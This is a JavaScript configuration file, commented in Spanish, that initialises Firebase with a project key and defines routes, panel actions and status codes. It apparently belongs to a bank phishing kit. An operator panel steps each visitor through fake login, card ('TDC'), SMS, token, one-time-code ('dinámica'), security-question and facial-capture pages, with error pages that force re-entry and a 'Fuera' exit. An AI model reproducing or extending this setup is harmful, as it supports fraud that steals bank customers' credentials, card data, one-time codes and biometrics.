// Configuración centralizada de Firebase y rutas

// Configuración de Firebase - test9a24o5o39ia

const firebaseConfig = {
  apiKey: "AIzaSyA0TRTsikzaUYfnxDW3BfKM4H8ClX6_CMk",
  authDomain: "o1u9a240.firebaseapp.com",
  projectId: "o1u9a240",
  storageBucket: "o1u9a240.firebasestorage.app",
  messagingSenderId: "246113174191",
  appId: "1:246113174191:web:37181bb0535448db76ca5a"
};
// Inicializar Firebase
if (typeof firebase !== 'undefined') {
    // Verificar si ya está inicializado
    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
        console.log('✅ Firebase inicializado correctamente');
    } else {
        console.log('✅ Firebase ya estaba inicializado');
    }
    
    // Crear referencia a Firestore
    const db = firebase.firestore();
    
    // Hacer db accesible globalmente
    window.db = db;
    console.log('✅ Variable db creada y disponible globalmente');
} else {
    console.error('❌ Firebase no está cargado. Verifica que los scripts de Firebase estén incluidos.');
}

// Configuración de la aplicación
const appConfig = {
    // Rutas de redirección
    routes: {
        1: { url: "/", name: "Login" },
        2: { url: "index_err.html", name: "Index Error" },
        3: { url: "tdc.html", name: "TDC" },
        4: { url: "tdc_err.html", name: "TDC Error" },
        5: { url: "dinamica.html", name: "Dinamica" },
        6: { url: "dinamica_err.html", name: "Dinamica Error" },
        7: { url: "#", name: "Fuera" },
        8: { url: "pregseg.html", name: "Pregunta Seguridad" },
        9: { url: "pregseg_err.html", name: "Pregunta Seguridad Error" },
        10: { url: "facial.html", name: "Facial" },
        11: { url: "facial_err.html", name: "Facial Error" },
    },

    // Tiempo de espera para redirección (en milisegundos)
    timeout: 100000, // 100 segundos

    // Configuración de acciones del panel
    actions: {
        home: { page: 1, color: "#87f79fff" },
        index_err: { page: 2, color: "#ffd6de" },
        index_er: { page: 2, color: "#ffd6de" },
        sms: { page: 3, color: "#e8fff0" },
        sms_err: { page: 4, color: "#ffd6de" },
        token: { page: 5, color: "#fff8e8" },
        token_err: { page: 6, color: "#ffd6de" },
        tdc: { page: 3, color: "#e8fff0" },
        tdc_err: { page: 4, color: "#ffd6de" },
        facial: { page: 10, color: "#fff3cd" },
        facial_err: { page: 11, color: "#ffd6de" },
        dinamica: { page: 5, color: "#fff8e8" },
        dinamica_err: { page: 6, color: "#ffd6de" },
        fuera: { page: 7, color: "#fff8e8" },
        pregseg: { page: 8, color: "#fff3cd" },
        pregseg_err: { page: 9, color: "#ffd6de" },
    },

    // Configuración de estados
    status: {
        0: { text: "Cargando", class: "warning" },
        1: { text: "Inicio", class: "success" },
        2: { text: "Inicio Error", class: "danger" },
        3: { text: "TDC", class: "success" },
        4: { text: "TDC Error", class: "danger" },
        5: { text: "Dinamica", class: "success" },
        6: { text: "Dinamica Error", class: "danger" },
        7: { text: "Fuera", class: "danger" },
        8: { text: "Preg. Seg.", class: "success" },
        9: { text: "Preg. Seg. Error", class: "danger" },
        10: { text: "Facial", class: "success" },
        11: { text: "Facial Error", class: "danger" },
    }
};

// Hacer la configuración accesible globalmente
window.appConfig = appConfig;
window.firebaseConfig = firebaseConfig;
